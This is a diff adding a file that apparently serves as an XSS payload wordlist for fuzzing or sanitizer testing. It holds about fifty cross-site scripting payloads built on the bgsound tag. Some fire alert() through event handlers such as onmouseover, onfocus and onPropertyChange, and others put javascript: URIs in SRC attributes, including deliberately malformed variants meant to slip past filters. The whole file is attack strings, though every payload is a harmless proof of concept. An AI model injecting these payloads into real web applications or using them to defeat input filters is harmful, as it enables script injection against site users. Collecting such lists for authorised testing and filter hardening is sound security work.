@@ -1,0 +1,47 @@
+<bgsound draggable="true" ondrag="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragend="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragenter="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragleave="alert(1)">test</bgsound>
+<bgsound draggable="true" ondragstart="alert(1)">test</bgsound>
+<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>
+<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
+<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>
+<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>
+<bgsound onbeforecopy="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforecut="alert(1)" contenteditable>test</bgsound>
+<bgsound onbeforepaste="alert(1)" contenteditable>test</bgsound>
+<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onclick="alert(1)">test</bgsound>
+<bgsound oncontextmenu="alert(1)">test</bgsound>
+<bgsound oncopy="alert(1)" contenteditable>test</bgsound>
+<bgsound oncut="alert(1)" contenteditable>test</bgsound>
+<bgsound ondblclick="alert(1)">test</bgsound>
+<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>
+<bgsound onkeydown="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeypress="alert(1)" contenteditable>test</bgsound>
+<bgsound onkeyup="alert(1)" contenteditable>test</bgsound>
+<bgsound onmousedown="alert(1)">test</bgsound>
+<bgsound onmouseenter="alert(1)">test</bgsound>
+<bgsound onmouseleave="alert(1)">test</bgsound>
+<bgsound onmousemove="alert(1)">test</bgsound>
+<bgsound onmouseout="alert(1)">test</bgsound>
+<bgsound onmouseover="alert(1)">test</bgsound>
+<bgsound onmouseup="alert(1)">test</bgsound>
+<bgsound onpaste="alert(1)" contenteditable>test</bgsound>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1207)"></bgsound onPropertyChange>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(308)"></bgsound onPropertyChange>
+<BGSOUND SRC="javascript:alert(1024);">
+<BGSOUND SRC="javascript:alert(1657);">
+<;BGSOUND SRC=";javascript:alert(1877);";>;
+<BGSOUND SRC="javascript.:alert(248);">
+<BGSOUND SRC="javascript:alert(743);">
+<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
+<BGSOUND SRC="javascript:alert('XSS');">
+<bgsound src="javascript:document.vulnerable=true;">
+<bgsound SRC="javascript:document.vulnerable=true;">
+<BGSOUND SRC="javascript:javascript:alert(1);">
+<BGSOUND SRC="javascript:javascript:alert(1588);">
+<BGSOUND SRC="javascript:javascript:alert(674);">
